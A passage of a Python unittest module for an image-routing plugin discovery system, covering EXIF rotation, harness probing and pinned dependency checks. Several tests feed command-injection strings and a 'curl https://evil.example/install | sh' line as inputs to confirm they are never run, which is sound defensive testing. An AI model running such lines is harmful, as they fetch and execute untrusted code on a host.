        self.assertEqual(result["decision"]["phase"], "decided")
        self.assertEqual([ctx["subject"]["passId"] for ctx in originals], ["decomposition", "routing"])
        self.provider.assert_not_called()
        self.fallback.assert_not_called()

    @staticmethod
    def oriented_jpeg(orientation):
        from forge.tests.test_jpeg import FIXTURE
        position = FIXTURE.find(b"\xff\xe1")
        length = struct.unpack(">H", FIXTURE[position + 2:position + 4])[0]
        clean = FIXTURE[:position] + FIXTURE[position + 2 + length:]
        tiff = (b"MM\0*" + struct.pack(">I", 8) + struct.pack(">H", 1)
                + struct.pack(">HHI", 274, 3, 1) + struct.pack(">H", orientation) + b"\0\0" + b"\0" * 4)
        payload = b"Exif\0\0" + tiff
        return clean[:2] + b"\xff\xe1" + struct.pack(">H", len(payload) + 2) + payload + clean[2:]

    def test_jpeg_exif_rotation_is_applied_before_crop_coordinates(self):
        upright, transform = prepare_reference(self.oriented_jpeg(6))
        width, height, channels, pixels = upright
        self.assertEqual((width, height, channels), (32, 32, 4))
        top = pixels[(4 * width + 15) * channels:(4 * width + 15) * channels + 3]
        bottom = pixels[(26 * width + 15) * channels:(26 * width + 15) * channels + 3]
        self.assertGreater(top[0], top[2])
        self.assertGreater(bottom[2], bottom[0])
        self.assertEqual(transform["exifOrientation"], 6)
        self.assertEqual(transform["sourceToUpright"], [[0, -1, 31], [1, 0, 0]])
        self.assertEqual(transform["boxCoordinates"], "upright-normalized")

    def test_jpeg_source_hash_and_upright_reference_are_both_bound(self):
        data = self.oriented_jpeg(6)
        (self.workspace / "reference.jpg").write_bytes(data)
        result = self.router().route(image="reference.jpg", objects=self.proposals())
        decision = result["decision"]
        self.assertEqual(decision["imageSha256"], hashlib.sha256(data).hexdigest())
        normalized = decision["referenceNormalization"]["uprightReference"]
        self.assertTrue((self.workspace / normalized["path"]).read_bytes().startswith(b"\x89PNG"))
        self.assertNotEqual(normalized["sha256"], decision["imageSha256"])
        self.assertEqual(self.router().verify_decision(result["decisionRef"]), decision)

    def test_progressive_jpeg_and_invalid_exif_fail_explicitly_without_consulting(self):
        baseline = self.oriented_jpeg(1)
        position = baseline.find(b"\xff\xc0")
        progressive = baseline[:position] + b"\xff\xc2" + baseline[position + 2:]
        for data, reason in ((progressive, "jpeg-conversion-required"),
                             (self.oriented_jpeg(9), "unsupported-reference-orientation")):
            with self.subTest(reason=reason):
                (self.workspace / "reference.jpg").write_bytes(data)
                result = self.router().route(image="reference.jpg", objects=self.proposals())
                self.assertEqual(result["decision"]["suspendedAt"]["reasonCode"], reason)
        self.provider.assert_not_called()

class ProgramDiscoveryTests(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory()
        self.addCleanup(self.temp.cleanup)
        self.workspace = Path(self.temp.name).resolve()
        self.controller = DecisionController(self.workspace, "probe-run")

    def test_actual_configured_harness_executes_version_and_exact_typed_queries(self):
        harness = self.workspace / "fixture_harness.py"
        harness.write_text('''import json, sys
args = sys.argv[1:]
if args == ["--version", "--json"]:
    print(json.dumps({"harness":"fixture-0.5", "commands":["capabilities"]}))
else:
    assert args[0] == "capabilities"
    print(json.dumps({"version":1,"query":{"from":args[2],"to":args[4]},"status":"answered","providers":[]}))
''')
        discovery = Discovery(self.controller, harness=(sys.executable, str(harness)))
        candidates, _ = discovery.enumerate()
        self.assertEqual(candidates, [])
        self.assertFalse(discovery.degraded)
        self.assertEqual(discovery.availability(), {"status": "capability-unavailable"})
        entries = [json.loads(line) for line in self.controller.journal_path.read_text().splitlines()]
        probes = [e["data"] for e in entries if e["event"] == "probe"]
        self.assertEqual(len(probes), 6)
        self.assertEqual(probes[0]["argv"][-2:], ["--version", "--json"])
        self.assertTrue(all(p["exitCode"] == 0 and len(p["stdoutSha256"]) == 64 for p in probes))
        self.assertTrue(all("install" not in p["argv"] and "add" not in p["argv"] for p in probes))

    def test_missing_harness_never_proves_jev_outage(self):
        discovery = Discovery(self.controller, harness=(str(self.workspace / "not-installed"),))
        self.assertEqual(discovery.enumerate(), ([], []))
        self.assertTrue(discovery.degraded)
        self.assertEqual(discovery.availability(), {"status": "availability-unproven"})

    def test_provider_ambiguity_names_all_claimants_and_never_selects_first(self):
        discovery = Discovery(self.controller)
        discovery.run = Mock(return_value=(0, encode({"harness": "fixture", "commands": ["capabilities"]})))
        def query(edge):
            if edge == EDGES["interior"]:
                return {"status": "ambiguous", "providers": [{"plugin": "interior"}, {"plugin": "other"}]}
            return {"status": "answered", "providers": []}
        discovery.query = Mock(side_effect=query)
        candidates, rejected = discovery.enumerate()
        self.assertEqual(candidates, [])
        ambiguous = next(r for r in rejected if r["reasonCode"] == "provider-ambiguous")
        self.assertEqual(ambiguous["claimants"], ["interior", "other"])

    def test_missing_card_and_gate_are_program_owned_rejections(self):
        discovery = Discovery(self.controller)
        row = {"plugin": "interior", "version": "1", "resolvedSha": "a" * 40,
               "dir": str(self.workspace), "gateRunner": None}
        manifest = encode({"name": "interior", "version": "1", "capabilities": [
            {"from": EDGES["interior"][0], "to": EDGES["interior"][1]}]})
        def file_bytes(_row, relative):
            if relative == "plugin.json":
                return manifest
            raise RouteError("provider-file-missing")
        discovery._pinned_file = Mock(side_effect=file_bytes)
        with self.assertRaises(RouteError) as caught:
            discovery._candidate(row, "interior", "answered", EDGES["interior"])
        self.assertEqual(caught.exception.reason_code, "route-card-missing")
        self.assertFalse(discovery._gate_producer(row))

    def test_registered_jev_is_discoverable_despite_default_four_download_selection(self):
        discovery = Discovery(self.controller)
        argv = ["python3", str(self.workspace / "tools/jev.py"), "decision-routing",
                "--workspace", "{workspace}", "--input", ".img2/artifacts/jev/contexts/routing.json",
                "--assets", ".img2/artifacts/jev/contexts/routing-assets.json"]
        row = {"plugin": "jev", "resolvedSha": "a" * 40, "dir": str(self.workspace),
               "steps": [{"id": "jev-decision-routing", "actor": "program", "argv": argv}]}
        files = {
            "plugin.json": encode({"name": "jev", "capabilities": [{"from": JEV_EDGE[0], "to": JEV_EDGE[1]}]}),
            "steps.json": encode([{"id": "jev-decision-routing", "actor": "program",
                "command": "python3 {plugin_dir}/tools/jev.py decision-routing --workspace {workspace} "
                           "--input .img2/artifacts/jev/contexts/routing.json "
                           "--assets .img2/artifacts/jev/contexts/routing-assets.json"}]),
            "tools/jev.py": b"# pinned discovery fixture"}
        discovery.run = Mock(return_value=(0, encode({"harness": "fixture", "commands": ["capabilities"]})))
        discovery.query = Mock(side_effect=lambda edge: {
            "status": "answered", "providers": [copy.deepcopy(row)] if edge == JEV_EDGE else []})
        discovery._pinned_file = Mock(side_effect=lambda provider, path: files[path])
        with patch("stage0_route.discovery.read_selectors",
                   return_value={"selectedPlugins": list(EDGES)}):
            candidates, rejected = discovery.enumerate()
        self.assertEqual(candidates, [])
        self.assertFalse(any(r["id"] == "jev" and r["reasonCode"] == "plugin-not-selected" for r in rejected))
        self.assertEqual(discovery.jev, row)
        self.assertEqual(discovery.jev_status, "present")
        self.assertIn(JEV_EDGE, [call.args[0] for call in discovery.query.call_args_list])
        discovery._pinned_file.side_effect = RouteError("provider-pin-mismatch")
        with patch("stage0_route.discovery.read_selectors",
                   return_value={"selectedPlugins": list(EDGES)}):
            discovery.enumerate()
        self.assertIsNone(discovery.jev)
        self.assertEqual(discovery.jev_status, "availability-unproven")

    def test_explicit_jev_lookup_still_refuses_missing_provider_with_default_four_selection(self):
        discovery = Discovery(self.controller)
        discovery.run = Mock(return_value=(0, encode({"harness": "fixture", "commands": ["capabilities"]})))
        discovery.query = Mock(return_value={"status": "answered", "providers": []})
        with patch("stage0_route.discovery.read_selectors",
                   return_value={"selectedPlugins": list(EDGES)}):
            discovery.enumerate()
        self.assertEqual(discovery.jev_status, "capability-unavailable")
        self.assertIsNone(discovery.jev)
        self.assertIn(JEV_EDGE, [call.args[0] for call in discovery.query.call_args_list])

    def character_executable(self, name, *, executable=True):
        path = self.workspace / name
        path.write_text("host-only executable fixture")
        path.chmod(0o700 if executable else 0o600)
        return path

    def test_character_dependencies_resolve_only_named_path_programs_and_numeric_versions(self):
        paths = {"node": self.character_executable("node-runtime"),
                 "chromium": self.character_executable("chromium-runtime")}
        discovery = Discovery(self.controller)
        discovery.run = Mock(side_effect=[(0, b"v22.0.0\n"), (0, b"Chromium 131.0.6778.85\n")])
        with patch.dict(os.environ, {}, clear=True), patch("stage0_route.discovery.shutil.which",
                side_effect=lambda name: str(paths[name])) as which:
            self.assertTrue(discovery.dependency("character-node>=22.0"))
            self.assertTrue(discovery.dependency("character-chromium>=1.0"))
        self.assertEqual([item.args[0] for item in discovery.run.call_args_list],
                         [(str(paths["node"].resolve()), "--version"), (str(paths["chromium"].resolve()), "--version")])
        self.assertEqual([item.args[0] for item in which.call_args_list], ["node", "chromium"])

    def test_character_old_node_and_failed_or_malformed_version_are_rejected(self):
        node = self.character_executable("old-node")
        discovery = Discovery(self.controller)
        with patch.dict(os.environ, {"IMG2_CHARACTER_NODE": str(node)}, clear=True):
            for result in ((0, b"v20.19.0\n"), (0, b"v21.99.99\n"), (1, b"v99.0.0\n"), (0, b"unknown")):
                with self.subTest(result=result):
                    discovery.run = Mock(return_value=result)
                    self.assertFalse(discovery.dependency("character-node>=22.0"))
        browser = self.character_executable("old-chromium")
        discovery.run = Mock(return_value=(0, b"Chromium 0.9.99"))
        with patch.dict(os.environ, {"IMG2_CHARACTER_BROWSER": str(browser)}, clear=True):
            self.assertFalse(discovery.dependency("character-chromium>=1.0"))

    def test_character_missing_chromium_does_not_search_alternate_browsers(self):
        discovery = Discovery(self.controller)
        discovery.run = Mock()
        with patch.dict(os.environ, {}, clear=True), patch("stage0_route.discovery.shutil.which", return_value=None) as which:
            self.assertFalse(discovery.dependency("character-chromium>=1.0"))
        which.assert_called_once_with("chromium")
        discovery.run.assert_not_called()

    def test_character_explicit_overrides_resolve_real_executables_without_path_fallback(self):
        node = self.character_executable("node with spaces")
        browser = self.character_executable("browser with spaces")
        node_link = self.workspace / "node-link"
        node_link.symlink_to(node)
        discovery = Discovery(self.controller)
        discovery.run = Mock(side_effect=[(0, b"v22.4.1"), (0, b"Chromium 130.0.0.1")])
        with patch.dict(os.environ, {"IMG2_CHARACTER_NODE": str(node_link),
                "IMG2_CHARACTER_BROWSER": str(browser)}, clear=True), patch("stage0_route.discovery.shutil.which") as which:
            self.assertTrue(discovery.dependency("character-node>=22.0"))
            self.assertTrue(discovery.dependency("character-chromium>=1.0"))
        which.assert_not_called()
        self.assertEqual([item.args[0] for item in discovery.run.call_args_list],
                         [(str(node.resolve()), "--version"), (str(browser.resolve()), "--version")])

    def test_character_invalid_overrides_and_command_strings_never_execute_or_fall_back(self):
        executable = self.character_executable("valid-runtime")
        nonexecutable = self.character_executable("not-executable", executable=False)
        broken_link = self.workspace / "broken-runtime"
        broken_link.symlink_to(self.workspace / "missing-target")
        values = ["", "node", "node --eval injected", str(nonexecutable), str(self.workspace),
                  str(self.workspace / "missing-runtime"), str(broken_link),
                  str(executable) + " --eval injected", "/bin/sh -c injected"]
        for variable, dependency in (("IMG2_CHARACTER_NODE", "character-node>=22.0"),
                                     ("IMG2_CHARACTER_BROWSER", "character-chromium>=1.0")):
            for value in values:
                with self.subTest(variable=variable, value=value):
                    discovery = Discovery(self.controller)
                    discovery.run = Mock()
                    with patch.dict(os.environ, {variable: value}, clear=True), patch("stage0_route.discovery.shutil.which") as which:
                        self.assertFalse(discovery.dependency(dependency))
                    discovery.run.assert_not_called()
                    which.assert_not_called()

    def test_character_card_probe_strings_cannot_supply_commands_or_paths(self):
        discovery = Discovery(self.controller)
        discovery.run = Mock()
        probes = ["character-node>=22.0; touch injected", "character-chromium>=1.0 --version",
                  "character-node=/bin/sh>=22.0", "/bin/node>=22.0", "character-python>=3.10"]
        with patch("stage0_route.discovery.shutil.which") as which:
            for probe in probes:
                with self.subTest(probe=probe):
                    self.assertFalse(discovery.dependency(probe))
        discovery.run.assert_not_called()
        which.assert_not_called()

    def test_character_probe_uses_existing_bounded_no_shell_runner_and_journal(self):
        node = self.character_executable("bounded-node")
        runner = Mock(return_value=subprocess.CompletedProcess([], 0, b"v22.1.0\n", b""))
        discovery = Discovery(self.controller, runner=runner)
        with patch.dict(os.environ, {"IMG2_CHARACTER_NODE": str(node)}, clear=True):
            self.assertTrue(discovery.dependency("character-node>=22.0"))
        runner.assert_called_once_with([str(node.resolve()), "--version"], capture_output=True,
            timeout=15, check=False, shell=False, cwd=str(self.workspace))
        self.assertEqual(len(discovery.probes), 1)

    def test_unknown_dependency_is_not_executed(self):
        discovery = Discovery(self.controller)
        discovery.run = Mock()
        self.assertFalse(discovery.dependency("curl https://evil.example/install | sh"))
        discovery.run.assert_not_called()

    def test_cli_missing_objects_is_request_input_not_synthetic_success(self):
        (self.workspace / "reference.png").write_bytes(png(1, 1, 3, b"abc"))
        with redirect_stdout(io.StringIO()) as output:
            result = main(["--workspace", str(self.workspace), "--run", "probe-run", "--image", "reference.png",
                           "--harness", str(self.workspace / "absent-harness")])
        self.assertEqual(result, 3)
        self.assertEqual(json.loads(output.getvalue())["decision"]["phase"], "suspended")

    def character_provider_fixture(self, *, terminal_gate=None, legacy_blocking=False, omit_deps=False):
        directory = self.workspace / "character-provider"
        (directory / "tools").mkdir(parents=True, exist_ok=True)
        sha = "c" * 40
        probes = ("python3>=3.10", "character-node>=22.0", "character-chromium>=1.0",
                  "character-bpy>=4.3", "character-three>=0.186.1")
        card = {"kind": "img2.route-card", "version": 1, "outputKind": "rigged-3d",
                "requires": {"intent": ["rig"]}, "costClass": "heavy",
                "deps": [] if omit_deps else [{"probe": probe} for probe in probes],
                "routedTerminalGate": terminal_gate if terminal_gate is not None else {
                    "id": "character-routed-terminal", "script": "tools/gate_routed_terminal.py"}}
        manifest = {"name": "character", "version": "0.3.0", "requires": {"harness": ">=0.5.0"},
                    "capabilities": [{"from": EDGES["character"][0], "to": EDGES["character"][1]}]}
        legacy = [{"id": "legacy-rigging", "blocking": legacy_blocking,
                   "command": "python3 {plugin_dir}/tools/legacy_gate.py"}]
        # These are source-presence fixtures, never passing gate verdicts.
        committed = {"plugin.json": encode(manifest), "route.json": encode(card), "gates.json": encode(legacy),
                     "tools/gate_routed_terminal.py": b"raise SystemExit('do not execute during discovery')\n",
                     "tools/legacy_gate.py": b"raise SystemExit('do not execute during discovery')\n"}
        for relative, data in committed.items():
            (directory / relative).write_bytes(data)
        row = {"plugin": "character", "version": "0.3.0", "resolvedSha": sha, "dir": str(directory),
               "gateRunner": {"argv": ["python3", "fixture-gate-runner"]}}
        discovery = Discovery(self.controller)
        discovery.version = "0.5.0"
        discovery.dependency = Mock(return_value=True)
        def read_pinned_source(argv):
            self.assertEqual(tuple(argv[:4]), ("git", "-C", str(directory), "show"))
            self.assertTrue(argv[4].startswith(sha + ":"))
            relative = argv[4][len(sha) + 1:]
            return (0, committed[relative]) if relative in committed else (1, b"")
        discovery.run = Mock(side_effect=read_pinned_source)
        return discovery, row, probes

    def test_character_routed_producer_is_available_without_a_blocking_legacy_gate(self):
        discovery, row, probes = self.character_provider_fixture()
        candidate = discovery._candidate(row, "character", "answered", EDGES["character"])
        self.assertTrue(candidate["blockingGateProduced"])
        self.assertEqual(candidate["dependencies"], {probe: True for probe in probes})
        self.assertEqual([call.args[0] for call in discovery.dependency.call_args_list], list(probes))
        pinned = [call.args[0][4].split(":", 1)[1] for call in discovery.run.call_args_list]
        self.assertEqual(pinned, ["plugin.json", "route.json", "tools/gate_routed_terminal.py"])
        self.assertNotIn("gates.json", pinned)
        self.assertNotIn("gatePassed", candidate)

    def test_character_altered_routed_gate_contract_never_falls_back_to_legacy_gate(self):
        markers = [
            {"id": "other-terminal", "script": "tools/gate_routed_terminal.py"},
            {"id": "character-routed-terminal", "script": "../tools/gate_routed_terminal.py"},
            {"id": "character-routed-terminal", "script": "/tmp/gate_routed_terminal.py"},
            {"id": "character-routed-terminal", "script": "tools/legacy_gate.py"},
            {"id": "character-routed-terminal", "script": "tools/gate_routed_terminal.py --accept"},
            {"id": "character-routed-terminal", "script": "tools/gate_routed_terminal.py", "command": "injected"},
        ]
        for marker in markers:
            with self.subTest(marker=marker):
                discovery, row, _ = self.character_provider_fixture(terminal_gate=marker, legacy_blocking=True)
                candidate = discovery._candidate(row, "character", "answered", EDGES["character"])
                self.assertFalse(candidate["blockingGateProduced"])
                self.assertEqual([call.args[0][4].split(":", 1)[1] for call in discovery.run.call_args_list],
                                 ["plugin.json", "route.json"])

    def test_character_routed_script_must_match_its_independent_source_pin(self):
        discovery, row, _ = self.character_provider_fixture()
        (Path(row["dir"]) / "tools/gate_routed_terminal.py").write_bytes(b"dirty producer")
        with self.assertRaises(RouteError) as caught:
            discovery._candidate(row, "character", "answered", EDGES["character"])
        self.assertEqual(caught.exception.reason_code, "provider-pin-mismatch")

    def test_character_local_unpinned_provider_cannot_admit_routed_script(self):
        discovery, row, _ = self.character_provider_fixture()
        row["resolvedSha"] = "local"
        with self.assertRaises(RouteError) as caught:
            discovery._candidate(row, "character", "answered", EDGES["character"])
        self.assertEqual(caught.exception.reason_code, "provider-unpinned")
        discovery.run.assert_not_called()
        discovery.dependency.assert_not_called()

    def test_character_missing_routed_script_is_not_a_producer(self):
        discovery, row, _ = self.character_provider_fixture()
        (Path(row["dir"]) / "tools/gate_routed_terminal.py").unlink()
        candidate = discovery._candidate(row, "character", "answered", EDGES["character"])
        self.assertFalse(candidate["blockingGateProduced"])

    def test_character_routed_producer_requires_each_actual_runtime_probe(self):
        for missing in ("python3>=3.10", "character-node>=22.0", "character-chromium>=1.0",
                        "character-bpy>=4.3", "character-three>=0.186.1"):
            with self.subTest(missing=missing):
                discovery, row, probes = self.character_provider_fixture()
                discovery.dependency.side_effect = lambda probe: probe != missing
                candidate = discovery._candidate(row, "character", "answered", EDGES["character"])
                self.assertFalse(candidate["blockingGateProduced"])
                self.assertIs(candidate["dependencies"][missing], False)
                self.assertEqual([call.args[0] for call in discovery.dependency.call_args_list], list(probes))

    def test_character_card_cannot_omit_program_owned_runtime_requirements(self):
        discovery, row, probes = self.character_provider_fixture(omit_deps=True)
        discovery.dependency.side_effect = lambda probe: probe != "character-three>=0.186.1"
        candidate = discovery._candidate(row, "character", "answered", EDGES["character"])
        self.assertFalse(candidate["blockingGateProduced"])
        self.assertEqual([call.args[0] for call in discovery.dependency.call_args_list], list(probes))

    def test_character_routed_marker_is_not_a_generic_gate_extension(self):
        discovery = Discovery(self.controller)
        discovery._pinned_file = Mock()
        card = {"routedTerminalGate": {"id": "character-routed-terminal", "script": "tools/gate_routed_terminal.py"}}
        deps = {probe: True for probe in ("python3>=3.10", "character-node>=22.0", "character-chromium>=1.0", "character-three>=0.186.1")}
        self.assertFalse(discovery._gate_producer({"plugin": "interior", "gateRunner": None},
            expected_name="interior", card=card, dependencies=deps))
        self.assertFalse(discovery._gate_producer({"plugin": "interior", "gateRunner": None},
            expected_name="character", card=card, dependencies=deps))
        discovery._pinned_file.assert_not_called()

    def three_inventory_pin(self, root):
        # Independent fixed-list oracle; do not borrow the implementation's list.
        names = ("build/three.core.js", "build/three.module.js", "examples/jsm/loaders/GLTFLoader.js",
                 "examples/jsm/utils/BufferGeometryUtils.js", "examples/jsm/utils/SkeletonUtils.js", "package.json")
        inventory = {"kind": "img2.character-three-package", "version": 1, "files": [
            {"path": name, "sha256": hashlib.sha256((root / name).read_bytes()).hexdigest()} for name in sorted(names)]}
        canonical = json.dumps(inventory, sort_keys=True, separators=(",", ":"), ensure_ascii=False, allow_nan=False).encode()
        return hashlib.sha256(canonical).hexdigest(), inventory["files"]

    def three_inventory_fixture(self, *, version="0.186.1", package_bytes=None):
        # Structural approval fixtures are not claims about official npm provenance
        # or rendering. A separate integration test uses the real approved host package.
        root = self.workspace / "approved-three"
        names = ("build/three.core.js", "build/three.module.js", "examples/jsm/loaders/GLTFLoader.js",
                 "examples/jsm/utils/BufferGeometryUtils.js", "examples/jsm/utils/SkeletonUtils.js", "package.json")
        for name in names:
            path = root / name
            path.parent.mkdir(parents=True, exist_ok=True)
            path.write_bytes((package_bytes if package_bytes is not None else encode({"name": "three", "version": version}))
                             if name == "package.json" else ("// inventory fixture: " + name).encode())
        pin, files = self.three_inventory_pin(root)
        return root, {"IMG2_CHARACTER_THREE_ROOT": str(root), "IMG2_CHARACTER_THREE_SHA256": pin}, files

    def test_character_three_checks_exact_host_approved_inventory_without_executing_anything(self):
        root, environment, files = self.three_inventory_fixture()
        discovery = Discovery(self.controller)
        discovery.run = Mock()
        with patch.dict(os.environ, environment, clear=True), patch("stage0_route.discovery.shutil.which") as which:
            facts = character_three_facts()
            self.assertEqual(facts, {"root": str(root.resolve()), "version": "0.186.1",
                "sha256": environment["IMG2_CHARACTER_THREE_SHA256"], "files": files, "approval": "host-approved"})
            self.assertTrue(discovery.dependency("character-three>=0.186.1"))
        which.assert_not_called()
        discovery.run.assert_not_called()

    def test_character_three_requires_explicit_absolute_root_and_approved_pin_without_fallback(self):
        root, good, _ = self.three_inventory_fixture()
        environments = [{}, {"IMG2_CHARACTER_THREE_ROOT": str(root)},
            {"IMG2_CHARACTER_THREE_SHA256": good["IMG2_CHARACTER_THREE_SHA256"]},
            {**good, "IMG2_CHARACTER_THREE_ROOT": "relative/three"},
            {**good, "IMG2_CHARACTER_THREE_ROOT": str(root / "missing")},
            {**good, "IMG2_CHARACTER_THREE_ROOT": str(root / "package.json")},
            {**good, "IMG2_CHARACTER_THREE_SHA256": ""},
            {**good, "IMG2_CHARACTER_THREE_SHA256": "0" * 64},
            {**good, "IMG2_CHARACTER_THREE_SHA256": "a" * 63},
            {**good, "IMG2_CHARACTER_THREE_SHA256": "G" * 64}]
        discovery = Discovery(self.controller)
        discovery.run = Mock()
        with patch("stage0_route.discovery.shutil.which") as which:
            for environment in environments:
                with self.subTest(environment=environment), patch.dict(os.environ, environment, clear=True):
                    self.assertFalse(discovery.dependency("character-three>=0.186.1"))
        which.assert_not_called()
        discovery.run.assert_not_called()

    def test_character_three_rejects_wrong_version_even_with_a_matching_reviewed_pin(self):
        for version in ("0.185.0", "0.187.0", "0.186.1-dev", 186):
            root, environment, _ = self.three_inventory_fixture(version=version)
            with self.subTest(version=version), patch.dict(os.environ, environment, clear=True):
                self.assertFalse(Discovery(self.controller).dependency("character-three>=0.186.1"))

    def test_character_three_rejects_missing_or_tampered_fixed_files(self):
        root, environment, files = self.three_inventory_fixture()
        with patch.dict(os.environ, environment, clear=True):
            for entry in files:
                path = root / entry["path"]
                original = path.read_bytes()
                with self.subTest(path=entry["path"]):
                    path.write_bytes(original + b"tampered")
                    self.assertIsNone(character_three_facts())
                    path.unlink()
                    self.assertIsNone(character_three_facts())
                    path.write_bytes(original)
                    self.assertIsNotNone(character_three_facts())

    def test_character_three_rejects_symlink_files_and_intermediate_aliases(self):
        root, environment, _ = self.three_inventory_fixture()
        module = root / "build/three.module.js"
        original = module.read_bytes()
        foreign = self.workspace / "foreign-module.js"
        foreign.write_bytes(original)
        module.unlink()
        module.symlink_to(foreign)
        with patch.dict(os.environ, environment, clear=True):
            self.assertIsNone(character_three_facts())
        module.unlink()
        module.write_bytes(original)
        (root / "build").rename(root / "real-build")
        (root / "build").symlink_to(root / "real-build", target_is_directory=True)
        with patch.dict(os.environ, environment, clear=True):
            self.assertIsNone(character_three_facts())

    def test_character_three_rejects_nonregular_files_without_blocking_on_fifo(self):
        root, environment, _ = self.three_inventory_fixture()
        module = root / "build/three.module.js"
        module.unlink()
        os.mkfifo(module)
        with patch.dict(os.environ, environment, clear=True):
            self.assertIsNone(character_three_facts())

    def test_character_three_parses_package_json_strictly_even_if_bytes_are_approved(self):
        for package in (b'{"version":"0.186.1","version":"0.186.1"}',
                        b'{"version":"0.186.1","invalid":NaN}', b"not-json", b"[]"):
            root, environment, _ = self.three_inventory_fixture(package_bytes=package)
            with self.subTest(package=package), patch.dict(os.environ, environment, clear=True):
                self.assertIsNone(character_three_facts())

    def test_character_three_facts_change_on_reapproval_instead_of_caching_true(self):
        root, environment, _ = self.three_inventory_fixture()
        with patch.dict(os.environ, environment, clear=True):
            original = character_three_facts()
            (root / "build/three.core.js").write_bytes(b"new explicitly reviewed bytes")
            self.assertIsNone(character_three_facts())
            pin, _ = self.three_inventory_pin(root)
            os.environ["IMG2_CHARACTER_THREE_SHA256"] = pin
            updated = character_three_facts()
            self.assertIsNotNone(updated)
            self.assertNotEqual(original["sha256"], updated["sha256"])
            self.assertTrue(Discovery(self.controller).dependency("character-three>=0.186.1"))

    def test_character_three_dependency_string_cannot_choose_a_path_or_other_version(self):
        root, environment, _ = self.three_inventory_fixture()
        discovery = Discovery(self.controller)
        discovery.run = Mock()
        with patch.dict(os.environ, environment, clear=True):
            for probe in ("character-three>=0.187.0", "character-three>=0.186.1; install",
                          "character-three=/unapproved>=0.186.1"):
                with self.subTest(probe=probe):
                    self.assertFalse(discovery.dependency(probe))
        discovery.run.assert_not_called()

    @unittest.skipUnless(os.environ.get("IMG2_CHARACTER_THREE_ROOT") and os.environ.get("IMG2_CHARACTER_THREE_SHA256"),
                         "requires the actual explicitly host-approved Three 0.186.1 package")
    def test_character_three_accepts_actual_known_host_approved_package(self):
        discovery = Discovery(self.controller)
        discovery.run = Mock()
        facts = character_three_facts()
        self.assertIsNotNone(facts)
        self.assertEqual(facts["version"], "0.186.1")
        self.assertEqual(facts["sha256"], os.environ["IMG2_CHARACTER_THREE_SHA256"])
        expected, files = self.three_inventory_pin(Path(os.environ["IMG2_CHARACTER_THREE_ROOT"]).resolve(strict=True))
        self.assertEqual((facts["sha256"], facts["files"]), (expected, files))
        self.assertTrue(discovery.dependency("character-three>=0.186.1"))
        discovery.run.assert_not_called()

    def test_pin_requires_real_commit_bytes_not_local_link_or_claimed_sha(self):
        discovery = Discovery(self.controller)
        path = self.workspace / "route.json"
        path.write_bytes(b"pinned")
        row = {"dir": str(self.workspace), "resolvedSha": "local"}
        with self.assertRaises(RouteError) as caught:
            discovery._pinned_file(row, "route.json")
        self.assertEqual(caught.exception.reason_code, "provider-unpinned")
        row["resolvedSha"] = "a" * 40
        discovery.run = Mock(return_value=(0, b"pinned"))
        self.assertEqual(discovery._pinned_file(row, "route.json"), b"pinned")
        path.write_bytes(b"dirty")
        with self.assertRaises(RouteError) as caught:
            discovery._pinned_file(row, "route.json")
        self.assertEqual(caught.exception.reason_code, "provider-pin-mismatch")

    def test_harness_requirement_is_enforced_before_reading_card(self):
        discovery = Discovery(self.controller)
        discovery.version = "0.4.0"
        row = {"plugin": "pixi2d", "version": "1"}
        manifest = {"name": "pixi2d", "version": "1", "requires": {"harness": ">=0.5.0"},
                    "capabilities": [{"from": "image", "to": "pixi2d-scene"}]}
        discovery._pinned_file = Mock(return_value=encode(manifest))
        with self.assertRaises(RouteError) as caught:
            discovery._candidate(row, "pixi2d", "answered", EDGES["pixi2d"])
        self.assertEqual(caught.exception.reason_code, "harness-version-incompatible")
        discovery._pinned_file.assert_called_once_with(row, "plugin.json")

    def test_legacy_or_other_group_jev_step_never_binds_routing_provider(self):
        discovery = Discovery(self.controller)
        discovery.run = Mock(return_value=(0, encode({"harness": "0.5.0", "commands": ["capabilities"]})))
        row = {"plugin": "jev", "resolvedSha": "a" * 40, "dir": str(self.workspace),
               "steps": [{"id": "jev-recommend", "actor": "program", "argv": ["python3", "legacy.py", "route"]}]}
        discovery._pinned_file = Mock(return_value=encode({
            "name": "jev", "capabilities": [{"from": JEV_EDGE[0], "to": JEV_EDGE[1]}]}))
        discovery.query = Mock(side_effect=lambda edge: {
            "status": "answered", "providers": [row] if edge == JEV_EDGE else []})
        discovery.enumerate()
        self.assertEqual(discovery.jev_status, "availability-unproven")
        self.assertIsNone(discovery.jev)

    def test_any_data_fault_degrades_to_intrinsic_base_candidates_only(self):
        discovery = Discovery(self.controller)
        discovery.run = Mock(return_value=(0, encode({"harness": "0.5.0", "commands": ["capabilities"]})))
        def query(edge):
            if edge == EDGES["interior"]:
                return {"status": "answered", "providers": [{"plugin": "interior"}]}
            return {"status": "data-fault" if edge == EDGES["cs2"] else "answered", "providers": []}
        discovery.query = Mock(side_effect=query)
        discovery._candidate = Mock(return_value={"id": "interior:pinned"})
        candidates, rejected = discovery.enumerate()
        self.assertEqual(candidates, [])
        self.assertTrue(discovery.degraded)
        self.assertIn({"id": "interior:pinned", "reasonCode": "enumeration-degraded"}, rejected)


class ReadOnlyProbeScopeTests(unittest.TestCase):
    def setUp(self):
        self.temporary = tempfile.TemporaryDirectory()
        self.addCleanup(self.temporary.cleanup)
        self.workspace = Path(self.temporary.name).resolve()
        self.controller = DecisionController(self.workspace, "probe-scope")
        self.runner = Mock(return_value=subprocess.CompletedProcess([], 0, b"probe-output", b""))
        self.discovery = Discovery(self.controller, runner=self.runner)

    def detailed_probes(self):
        return [entry["data"] for entry in
                map(json.loads, self.controller.journal_path.read_text().splitlines())
                if entry["event"] == "probe" and "argv" in entry["data"]]

    def test_nested_exception_restores_scope_and_other_discovery_keeps_journaling(self):
        other = Discovery(self.controller, runner=self.runner)
        with read_only_probes(self.discovery):
            self.discovery.run(["fixture-probe"])
            with self.assertRaises(RuntimeError):
                with read_only_probes(self.discovery):
                    self.discovery.run(["fixture-probe"])
                    raise RuntimeError("unwind nested scope")
            self.discovery.run(["fixture-probe"])
            other.run(["other-discovery"])
        self.discovery.run(["outside-scope"])
        self.assertEqual([probe["argv"] for probe in self.detailed_probes()],
                         [["other-discovery"], ["outside-scope"]])
        self.assertEqual(self.runner.call_count, 5)

    def test_same_discovery_concurrent_thread_does_not_inherit_suppression(self):
        results = []
        with read_only_probes(self.discovery):
            thread = threading.Thread(target=lambda: results.append(self.discovery.run(["other-thread"])), daemon=True)
            thread.start()
            thread.join(timeout=2)
            self.assertFalse(thread.is_alive(), "independent probe thread failed to finish")
